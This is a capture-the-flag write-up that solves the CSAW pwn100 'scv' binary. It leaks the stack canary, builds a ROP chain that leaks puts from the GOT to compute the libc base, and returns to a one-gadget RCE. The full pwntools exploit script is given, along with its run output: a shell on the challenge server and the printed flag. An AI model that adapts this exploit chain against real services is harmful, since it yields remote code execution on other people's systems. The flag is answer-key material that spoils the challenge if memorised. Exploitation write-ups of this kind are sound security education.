### Solved by superkojiman

This one was worth 100 points. The binary comes with NX and a stack canary for protection. 

```
|root|csaw|~/work/pwn100-scv|
# checksec scv
[*] '/root/work/pwn100-scv/scv'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The binary displays a menu of three items. Option 1 allows us to enter some data, option 2 prints out the data we've entered, and option 3 exits the program. 

We can clearly overflow the buffer and overwrite the saved return pointer:

```
|root|csaw|~/work/pwn100-scv|
# ./scv
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>1
-------------------------
[*]SCV IS ALWAYS HUNGRY.....
-------------------------
[*]GIVE HIM SOME FOOD.......
-------------------------
>>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>3
[*]BYE ~ TIME TO MINE MIENRALS...
*** stack smashing detected ***: ./scv terminated
Aborted (core dumped)
```

Unfortunately we're also overwriting the stack canary which causes the binary to abort. So we'll need to leak the stack canary. Doing that is actually pretty easy. The stack canary is 168 bytes from the start of the buffer. So if we write exactly 168 bytes and then print the contents of the buffer, it will also print out the stack canary since the string is not null terminated. 

```
# Leak stack canary
r.sendline("1")
r.recvuntil(">>")

buf = ""
buf += "A"*168

r.sendline(buf)
r.recvuntil(">>")

r.sendline("2")
canary = r.recvuntil(">>").split("-------------------------")[3]

canary = "\x00" + canary[170:177]
print "Leaked canary:      ",  hex(u64(canary))
```

The stack canary starts with a null byte. Since we're overwriting it, we need to make sure we add it back in so we get the correct value of the stack canary. Here's how it looks:

```
|root|csaw|~/work/pwn100-scv|
# ./sploit.py
[+] Opening connection to pwn.chal.csaw.io on port 3764: Done
Leaked canary:       0x9895b2e495b4600
```

Now that we have the stack canary, we can overwrite the saved return pointer without triggering a stack smashing protection error. We're provided with a copy of the target's libc. Here's the plan of attacK:

* leak a libc address; eg: puts() (aka _IO_puts)
* find the offset of _IO_puts in the provided libc: ```readelf -s libc-2.23.so | grep puts```
* calculate libc's base address by subtracting the offset of _IO_puts from the leaked address of _IO_puts
* locate the offset of a one-gadget RCE in the provided libc
* add libc's base address to the one-gadget RCE offset and return to that, which hopefully gives us a shell

To leak puts() address, we need to create a short ROP chain that uses put() to print out its own address in the GOT:

```
pop_rdi  = p64(0x00400ea3)
puts_got = p64(0x602018)
puts_plt = p64(0x4008d0)

buf = ""
buf += "A"*168
buf += canary
buf += "B"*8
buf += pop_rdi
buf += puts_got
buf += puts_plt

buf += p64(0x400a96)

r.sendline(buf)
r.recvuntil(">>")

r.sendline("3")
d = r.recv()
puts_libc = d[34:40] + "\x00\x00"
print "Leaked _IO_puts():  ", hex(u64(puts_libc))

libc_base = u64(puts_libc) - puts_off
print "Libc base:          ", hex(libc_base)
```

Here it is in action:

```
|root|csaw|~/work/pwn100-scv|
# ./sploit.py
[+] Opening connection to pwn.chal.csaw.io on port 3764: Done
Leaked canary:       0x19723498e7790d00
Triggering overflow
Len puts_libc 8
Leaked _IO_puts():   0x7ff279a7e690
Libc base:           0x7ff279a0f000
```

Finding the offset to a working one-gadget RCE is easy using the [one_gadget](https://github.com/david942j/one_gadget) tool. In this case it turns out to be ```0xf0274``` Adding this offset to libc's base address gives us its location in memory which we can return to. Here's the final exploit:

```
#!/usr/bin/env python

from pwn import *
import sys

# RIP at offset 184

pop_rdi  = p64(0x00400ea3)
puts_got = p64(0x602018)
puts_plt = p64(0x4008d0)

puts_off = 0x6f690

r = remote("pwn.chal.csaw.io", 3764)

r.recvuntil(">>")

# Leak stack canary
r.sendline("1")
r.recvuntil(">>")

buf = ""
buf += "A"*168

r.sendline(buf)
r.recvuntil(">>")

r.sendline("2")
canary = r.recvuntil(">>").split("-------------------------")[3]

canary = "\x00" + canary[170:177]
print "Leaked canary:      ",  hex(u64(canary))

# Send payload with canary. Leak a libc address
r.sendline("1")
r.recvuntil(">>")

buf = ""
buf += "A"*168
buf += canary
buf += "B"*8
buf += pop_rdi
buf += puts_got
buf += puts_plt

buf += p64(0x400a96)

r.sendline(buf)
r.recvuntil(">>")

print "Triggering overflow"
r.sendline("3")
d = r.recvuntil(">>")
puts_libc = d[34:40] + "\x00\x00"
print "Len puts_libc", len(puts_libc)
print "Leaked _IO_puts():  ", hex(u64(puts_libc))

libc_base = u64(puts_libc) - puts_off
print "Libc base:          ", hex(libc_base)

# overwrite saved return pointer with address of one-gadget-rce
r.sendline("1")
r.recvuntil(">>")

rce = libc_base + 0xf0274
print "one-gadget RCE at", hex(rce)

buf = ""
buf += "A"*168
buf += canary
buf += "B"*8
buf += p64(rce)

r.sendline(buf)

# Trigger the overflow again and get shell
r.sendline("3")
r.interactive()
```

And now we can get the flag: 

```
|root|csaw|~/work/pwn100-scv|
# ./sploit.py
[+] Opening connection to pwn.chal.csaw.io on port 3764: Done
Leaked canary:       0xda47693da3d80e00
Triggering overflow
Len puts_libc 8
Leaked _IO_puts():   0x7fa18a200690
Libc base:           0x7fa18a191000
one-gadget RCE at 0x7fa18a281274
[*] Switching to interactive mode
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>[*]BYE ~ TIME TO MINE MIENRALS...
$ ls
flag
scv
$ cat flag
flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}
```
